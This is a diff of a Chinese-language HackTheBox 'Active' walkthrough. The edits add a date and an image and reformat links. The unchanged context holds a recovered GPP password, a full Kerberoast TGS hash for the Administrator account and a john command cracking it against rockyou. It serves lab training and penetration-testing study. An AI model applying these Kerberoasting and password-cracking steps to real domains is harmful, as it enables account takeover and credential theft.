@@ -1,5 +1,6 @@
 ---
 title: Active
+date: 2024-07-09
 weight: 148
 tags:
   - windows
@@ -7,6 +8,8 @@ tags:
   - group-policy-preferences
   - kerberoast
 ---
+
+![active_rank.png](active_rank.png)
 
 ## 00. 摘要
 
@@ -170,7 +173,7 @@ password: GPPstillStandingStrong2k18
 
 ![Active-bloodhound.png](Active-bloodhound.png)
 
-拿到账户密码之后，使用 [[RustHound]] 收集域信息，然后用 [[../../../blog/BloodHound-Tips]] 分析，发现可以对Administrator账户进行 [[Kerberoast]] 攻击
+拿到账户密码之后，使用 RustHound 收集域信息，然后用 [BloodHound-Tips](/blog/BloodHound-Tips) 分析，发现可以对Administrator账户进行 [Kerberoast](/blog/Kerberoast) 攻击
 
 ## 04. Kerberoast攻击提权到Administrator
 
@@ -199,7 +202,7 @@ active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=
 $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$7ef9434bf8c12b5aad15a88fe7d2416b$a58d114dc20bae25178263672ca0a009b77fcd40721fd22dfe2b405653d501e9315d50cee92f72097b0831f782d55da6f2a04df784035ebabb6a969ae160f33879131175823bf6876505f55d7f8c4f3f4b5d48eaf890b61f7e6102d12f02970f6c3ace30c624bd977f1d09fb884263b88d8cc06586755ac16a577013ebdc11deb9bdd9e28afc21a7a60016c69a935990c360c0d6c587b0538cd1822026996cc1429bfcc1e612ff2419922fcd1b5dba32be8038a5526a8ce580e9b964540b6a066056c2224be9e4e5e4a1b8f93a3584794b4fe02114f05c1b81837974113427754ab9cc34404d27b8497f5c7b409d54dff78331a35af74505d0f5f08aa08830167ff540303009ff258490e27c8ff99c01a1d47bdfc562231f7d2e2a37da4481795c126d8ff71693649a50b9129dd3744180d0079bf15f53ab35b231d614b3fa9f85d9488e00884d46da590e437802666e12f01f9177a030a9d9a338aa6ee471a4e95b1d126987756e809009e193decae5deba90c9a9ab64adb99ae6a2a601ada9840f2abd04ef9e3d5f721148e705cb925934ca387eaa23d55d2b0615e751bde7f1a12d9125e08f988fe7575e01ab94e024a604abbd9c6b8b5707744098cbab12501fd6eeac61f6b8e6014bd46e5d305694f7d6fd223eda01fa6de182672a64afe4d73d8f8fde70c7c2f513beb624e8b7806bf62399572dee4cc5829f0360742f81c1d88d8f798755981e87e9ed3eb13851e69f3d5ac60f6e23cdd2239cf36e584010b03d812628253aab25965af6c6723bd7ff9db3a469db0603eb3b78c257c986663c4a23e59565759272114acc19c0105c8e227efef3c8758498b2a236a45a0f69b26931f515405b480ccd890ba2c07a4b02ef53f2f68a072bc936c989dc95dfae40eaa5aa2f2efb69a526d98bd2ad78de17069144fbab45896b2a5e0d85859f58cf5b826bec99f20246bffd8193c4b0a28c08fb2914fd88cf6e27388c118ee398a87fb1676ec33438032939ba0e807cf049ebfe13f52ebe06fa0762ba9917ada48e1f788f33d32d5cc298543e6e697acc3341c1a80c7de43fa452bd76cf4997cac72954ab4a6c85d7b873118fe87022d547ea0ad2f30a5856e05cf29ddd6e49d437435ed31a4e99acb8894468ef61fe6e54fe66d504527fa6e26a8cb8d44e3d96cdf82787c2a6469100d7d1eaea0430ff1406359d1f46b2808752718ec5aa6cf8b9a7f264c0fd22cbf18eb15e6d3722dc3c1a48b530b66a39
 ```
 
-得到ST之后使用 [[john]] 爆破得到明文密码。
+得到ST之后使用 john 爆破得到明文密码。
 
 ```bash
 kali@kali[~]$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
